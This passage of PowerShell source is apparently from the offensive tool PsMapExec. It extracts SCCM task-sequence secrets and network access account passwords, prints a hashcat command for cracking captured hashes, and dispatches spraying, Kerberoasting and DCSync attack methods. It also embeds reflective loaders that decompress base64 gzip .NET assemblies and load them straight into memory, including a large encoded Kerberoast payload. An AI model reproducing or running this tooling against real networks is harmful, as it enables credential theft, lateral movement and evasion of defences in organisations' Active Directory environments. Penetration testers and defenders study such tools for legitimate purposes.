        $TaskSequences += Select-String -InputObject $DataOutput -Pattern "<sequence version=.*?</sequence>" -AllMatches
        $counter = 0

        # Process each sequence, save only if unique
        foreach ($Match in $TaskSequences.Matches) {
            $sequenceHash = [System.BitConverter]::ToString([System.Security.Cryptography.HashAlgorithm]::Create("MD5").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Match.Value)))

            if (-not $UniqueSequences.ContainsKey($sequenceHash)) {
                $UniqueSequences[$sequenceHash] = $true
                $sequenceXml = [xml]$Match.Value
                $filename = Join-Path -Path $DirectoryPath -ChildPath "TaskSequence_$counter.xml"
                $sequenceXml.Save($filename)
                $counter++

                # Check for specific keywords
                $keywords = @('OSDLocalAdminPassword', 'OSDDomainName', 'OSDJoinPassword', 'OSDJoinAccount', 'OSDRegisteredUserName', 'OSDRegisteredOrgName', 'net user', 'convertto-securestring', 'password')
                foreach ($keyword in $keywords) {
                    if ($sequenceXml.InnerXml -match $keyword) {
                        $InterestingFiles += $filename | Split-Path -Leaf
                        break
                    }
                }
            }
        }

        if ($counter -gt 0) {
            Write-Host ""
            Write-Host ""
            Write-Host "-[$ComputerName]-"
            Write-Host ""
 
            Write-Host "Task Sequences"
            Write-Host "Directory Path  : $DirectoryPath"
            Write-Host "Task Sequences  : Found $($counter) Task Sequences and saved to XML"

            if ($InterestingFiles.Count -gt 0) {
                Write-Host "Possible Creds  : " -NoNewline
                Write-Host "$($InterestingFiles -join ', ')" -NoNewline -ForegroundColor "Yellow"
                Write-Host " <--- check for creds!"
            }
        }

        Write-Host ""

        $NAACredentials = @()
        $NAACredentials += Select-String -InputObject $DataOutput -Pattern "Network Access Username:\s*(.+?)\s*Network Access Password:\s*(\S+)" -AllMatches

        foreach ($cred in $NAACredentials.Matches) {
            $NAAUsername = ($cred.Groups[1].Value -replace '[\x00-\x1F\x7F]', '').Trim()
            $NAAPassword = ($cred.Groups[2].Value -replace '[\x00-\x1F\x7F]', '').Trim()
            $Credential = "$NAAUsername`:$NAAPassword"

            # Extract domain and username for BH Query
            $Split = $NAAUsername -split '\\'
            $NAADomain = $Split[0]
            $NAAUser = $Split[1]
            Append-BHQuery -UserName $NAAUser -Domain $NAADomain -UserOwned -Password $NAAPassword -PasswordProperty

            if (-not $UniqueCredentials.ContainsKey($Credential)) {
                $UniqueCredentials[$Credential] = $true
            }
        }

        if ($UniqueCredentials.Count -gt 0) {
            if ($counter -lt 1) {
                Write-Host ""
                Write-Host "-[$ComputerName]-"
                Write-Host ""
            }

            $outputFile = Join-Path -Path $DirectoryPath -ChildPath "NAA-Credentials.txt"

            Write-Host "Network Access Accounts"
            Write-Host "NAA File Path   : $outputFile"

            foreach ($Credential in $UniqueCredentials.Keys) {
                Write-Host "NAA Credentials :" -NoNewline
                Write-Host " $Credential" -ForegroundColor "Yellow"
            }

            $UniqueCredentials.Keys | Out-File -FilePath $outputFile
        }
    }

    ################################################################################################################
    ################################################## Function: MDF ###############################################
    ################################################################################################################

    Function Parse-MDF {

        if ($Global:SuccessCount -eq 0) { return }
        
        Write-Host "`n`nCrack with Hashcat" -ForegroundColor "Yellow"
        Write-Output "hashcat.exe -m 1731 -a 0 -O 0x020050B40C7843AC5C196F9375549D3... Wordlists\rockyou.txt -r rules\best64.rule"

    }


    ################################################################################################################
    ################################################ Execute defined functions #####################################
    ################################################################################################################

    switch ($Method) {
        "All" { Method-All }
        "WinRM" { Method-WinRM }
        "MSSQL" { Method-MSSQL }
        "SMB" { Method-SMB }
        "WMI" { Method-WMI }
        "RDP" { Method-RDP }
        "GenRelayList" { GenRelayList }
        "SessionHunter" { Method-SessionHunter }
        "Spray" { Method-Spray }
        "VNC" { Method-VNC }
        "Kerberoast" { Method-Kroast }
        "Inject" {}
        "IPMI" { Method-IPMI }
        "DCSync" { Method-DCSync }
        "LDAP" { Method-LDAP }
        "LDAPS" { Method-LDAP }
        
    }

    if (!$NoParse) { if ($Module -eq "SAM") { Parse-SAM } }
    if (!$NoParse) { if ($Module -eq "eKeys") { Parse-eKeys } }
    if (!$NoParse) { if ($Module -eq "LogonPasswords") { Parse-LogonPasswords } }
    if (!$NoParse) { if ($Module -eq "KerbDump") { Parse-KerbDump } }
    if (!$NoParse) { if ($Module -eq "NTDS") { Parse-NTDS -NTDSDirectory $DCSyncFullDump } }
    if (!$NoParse) { if ($Module -eq "SCCM") { Parse-SCCM } }
    if (!$NoParse) { if ($Module -eq "TGTDeleg") { Parse-TGTDeleg } }
    if (!$NoParse) { if ($Module -eq "NTLM") { Parse-NTLM } }
    if (!$NoParse) { if ($Module -eq "MDF") { Parse-MDF } }
    if (!$NoParse) { if ($Method -eq "DCSync" -and $Option -notlike "*dcsync:*") { Parse-NTDS -NTDSDirectory $DCSyncFullDump } }
    
    RestoreTicket
    
    if ($Global:SuccessCount -gt 0 ) {
        Write-host "`n`Success Count    : " -NoNewline
        Write-Host "$SuccessCount" -ForegroundColor "Green"

    }

    else {

        Write-host "`n`Success Count    : " -NoNewline
        Write-Host "$SuccessCount"

    }

    if ($Global:AccessDeniedCount -gt 0 ) {
        
        Write-host "Access Denied    : " -NoNewline 
        Write-Host "$AccessDeniedCount" -ForegroundColor "Yellow"

    }


    $Time = (Get-Date).ToString("HH:mm:ss")
    Write-Host "Script Completed : $Time"
    $elapsedTime = (Get-Date) - $startTime
    Write-Host "Elapsed Time     : $elapsedTime"
    
    try { $searcher.Dispose() } Catch {}
    $CurrentUser = $null

    Write-Output ""

    if ($Method -eq "Spray") {
    
        Add-Type -AssemblyName System.Windows.Forms
        $global:balloon = New-Object System.Windows.Forms.NotifyIcon

        $path = (Get-Process -Id $pid).Path
        $balloon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)

        $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
        $balloon.BalloonTipText = "Spraying complete `nSuccess Count: $SuccessCount"
        $balloon.BalloonTipTitle = "PsMapExec"

        $balloon.Visible = $true
        $balloon.ShowBalloonTip(30000)

        Start-Sleep -Seconds 5

        $balloon.Dispose()


    }

}

################################################################################################################
########################################## End of main function ################################################
################################################################################################################

$Global:Encrypt = {
    function Invoke-AES([string]$k, [string]$iv, [string]$t) {
        $a = New-Object Security.Cryptography.AesCryptoServiceProvider
        $a.KeySize = 256
        $a.BlockSize = 128
        $a.Mode = 'CBC'
        $a.Padding = 'PKCS7'

        # Ensure the key and IV are the correct size
        $keyBytes = [Text.Encoding]::UTF8.GetBytes($k)
        $ivBytes = [Text.Encoding]::UTF8.GetBytes($iv)
        $a.Key = if ($keyBytes.Length -eq 32) { $keyBytes } else { $keyBytes[0..31] }
        $a.IV = if ($ivBytes.Length -eq 16) { $ivBytes } else { $ivBytes[0..15] }

        $encryptor = $a.CreateEncryptor($a.Key, $a.IV)
        $plainTextBytes = [Text.Encoding]::UTF8.GetBytes($t)
        $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)
        $a.Dispose()

        return [Convert]::ToBase64String($encryptedBytes)
    }
}

$Global:Decrypt = {
    function Invoke-Decrypt([string]$k, [string]$iv, [string]$encryptedText) {
        $a = New-Object Security.Cryptography.AesCryptoServiceProvider
        $a.KeySize = 256 
        $a.BlockSize = 128
        $a.Mode = 'CBC'
        $a.Padding = 'PKCS7'

        $keyBytes = [Text.Encoding]::UTF8.GetBytes($k)
        $ivBytes = [Text.Encoding]::UTF8.GetBytes($iv)
        $a.Key = if ($keyBytes.Length -eq 32) { $keyBytes } else { $keyBytes[0..31] }
        $a.IV = if ($ivBytes.Length -eq 16) { $ivBytes } else { $ivBytes[0..15] }

        $encryptedBytes = [Convert]::FromBase64String($encryptedText)
        $decryptor = $a.CreateDecryptor($a.Key, $a.IV)
        $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
        $a.Dispose()

        return [Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)
    }
}


$Global:rbs = @'
function Invoke-rTickets
{
    $a=New-Object IO.MemoryStream(,[Convert]::frOMbaSe64StrInG(""))
    $gzipStream = New-Object IO.Compression.GzipStream($a, [IO.Compression.CompressionMode]::Decompress)
    $memStream = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($memStream)
    $reflectedAssembly = [System.Reflection.Assembly]::Load($memStream.ToArray())
    $currentConsoleOutput = [Console]::Out
    $textWriter = New-Object IO.StringWriter
    [Console]::SetOut($textWriter)
    [Intranex.Program]::Main([string[]]$args)
    [Console]::SetOut($currentConsoleOutput)
    $textWriter.ToString()
  
}
'@

$Global:irdp = @'
function Invoke-RDP{
    Param ([String]$pRDP = " ")
    
    $memoryStreamInput = New-Object IO.MemoryStream(, [Convert]::FromBase64String(""))
    $gzipStream = New-Object IO.Compression.GzipStream($memoryStreamInput, [IO.Compression.CompressionMode]::Decompress)
    $memoryStreamOutput = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($memoryStreamOutput)
    [byte[]] $decompressedBytes = $memoryStreamOutput.ToArray()
    $loadedAssembly = [System.Reflection.Assembly]::Load($decompressedBytes)
    $originalOutput = [Console]::Out
    $stringWriter = New-Object IO.StringWriter
    [Console]::SetOut($stringWriter)
    $programArgs = [System.Text.RegularExpressions.Regex]::Split($pRDP, "\s+")
    [pRDP.Program]::Main($programArgs)
    [Console]::SetOut($originalOutput)
    $capturedOutput = $stringWriter.ToString()
    $capturedOutput

}
'@

$Global:rst = @'
function Invoke-Kroast
{
    $kr=New-Object IO.MemoryStream(,[Convert]::frOMbaSe64StrInG("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